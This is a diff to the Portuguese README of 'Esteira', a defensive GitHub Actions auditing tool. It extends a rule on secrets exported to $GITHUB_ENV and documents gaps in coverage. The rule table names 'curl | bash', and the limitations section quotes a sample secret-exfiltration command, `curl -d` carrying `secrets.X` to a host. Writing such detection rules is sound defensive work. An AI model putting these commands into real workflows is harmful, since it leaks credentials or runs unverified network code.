@@ -44,7 +44,7 @@ esta tabela divergir do catálogo, inclusive na severidade).
 | `unpinned-action-thirdparty` | Action de terceiros por tag, não por SHA | 🟠 Alta | A03 · CWE-1357 |
 | `secret-to-thirdparty-action` | `GITHUB_TOKEN`/segredo via `with:` para action de terceiros **não** fixada por SHA | 🟠 Alta | A03 · CWE-522 |
 | `broad-permissions` | `write-all` / escopos de escrita globais | 🟠 Alta | A01 · CWE-732 |
-| `secret-in-run` | Segredo impresso em `echo`/`printf` (ou no `console.log` do `github-script`) | 🟠 Alta | A09 · CWE-532 |
+| `secret-in-run` | Segredo impresso em `echo`/`printf` (ou no `console.log` do `github-script`) — ou exportado para `$GITHUB_ENV`, o que o entrega a todos os steps seguintes (🟡 Média) | 🟠 Alta | A09 · CWE-532 |
 | `checkout-credentials-in-artifact` | checkout sem `persist-credentials: false` + `upload-artifact` publicando o workspace | 🟠 Alta | A02 · CWE-522 |
 | `invalid-yaml` | Workflow que não parseia (análise estrutural pulada — **fail-closed**) | 🟠 Alta | — · CWE-1288 |
 | `curl-pipe-shell` | `curl \| bash` — código da rede sem verificação | 🟡 Média | A03 · CWE-494 |
@@ -230,7 +230,7 @@ Ferramenta **defensiva**, para auditar pipelines que você mantém ou tem autori
 
 Análise estática não substitui revisão humana, e a Esteira é honesta sobre o que **não** cobre hoje:
 
-- **Exfiltração de segredo por rede** (`curl -d "t=${{ secrets.X }}" host`) não é marcada: enviar um token a um host legítimo (`Authorization: Bearer`) é uso normal, e flagar geraria falso-positivo demais. Apenas segredo impresso no log — `echo`/`printf` no `run:`, `console.log`/`core.info` no `github-script` — é apontado.
+- **Exfiltração de segredo por rede** (`curl -d "t=${{ secrets.X }}" host`) não é marcada: enviar um token a um host legítimo (`Authorization: Bearer`) é uso normal, e flagar geraria falso-positivo demais. São apontados o segredo impresso no stdout (`echo`/`printf` no `run:`, `console.log`/`core.info` no `github-script`) e o segredo exportado para `$GITHUB_ENV`. **`$GITHUB_OUTPUT` ainda não é apontado** — a propagação é análoga, mas não foi adjudicada em campo, e regra não medida é ruído em potencial.
 - **`with.args`/`entrypoint` de actions `docker://`** não são inspecionados; os sinks de execução varridos são `run:` e o `script:` do `actions/github-script`.
 - **Cobertura de runner** limita-se a labels literais e `matrix` resolvível estaticamente; um `runs-on` de expressão dinâmica não-resolvível não é classificado.
 - **`curl | bash` com mais de 3 wrappers encadeados** (`sudo env time nice …`) deixa de casar. É troca deliberada: a forma ilimitada do padrão era exponencial em backtracking e uma linha `run:` de 129 caracteres travava a varredura por 7 s (e ~160 caracteres, por horas) — DoS do próprio portão de auditoria.
